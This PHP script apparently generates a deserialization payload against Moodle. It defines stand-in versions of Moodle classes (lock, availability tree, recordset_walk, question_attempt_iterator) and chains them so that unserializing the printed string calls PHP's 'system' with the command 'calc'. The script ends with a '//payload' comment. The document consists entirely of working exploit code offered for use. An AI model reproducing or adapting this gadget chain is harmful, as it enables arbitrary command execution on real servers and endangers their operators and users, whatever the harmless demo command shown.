<?php
namespace core\lock {
    class lock {
        public function __construct($class)
        {
            $this->key = $class;
        }
    }
}
namespace core_availability{
    class tree {
        public function __construct($class)
        {
            $this->children = $class;
        }
    }
}
namespace core\dml{
    class recordset_walk {
        public function __construct($class)
        {
            $this->recordset = $class;
            $this->callbackextra = null;
            $this->callback ="system";
        }
    }
}
namespace {
    class question_attempt_iterator{
        public function __construct($class)
        {
            $this->slots = array(
                "xxx" => "key"
            );
            $this->quba = $class;
        }
    }
    class question_usage_by_activity{
        public function __construct()
        {
            $this->questionattempts = array(
                "key" => "calc"
            );
        }
    }
    class core_question_external{
    }
    $add_lib = new core_question_external();
    $activity = new question_usage_by_activity();
    $iterator = new question_attempt_iterator($activity);
    $walk = new core\dml\recordset_walk($iterator);
    $tree = new core_availability\tree($walk);
    $lock = new core\lock\lock($tree);
    $arr = array($add_lib, $lock);
    $value = serialize($arr);
    echo $value;
}
//payload
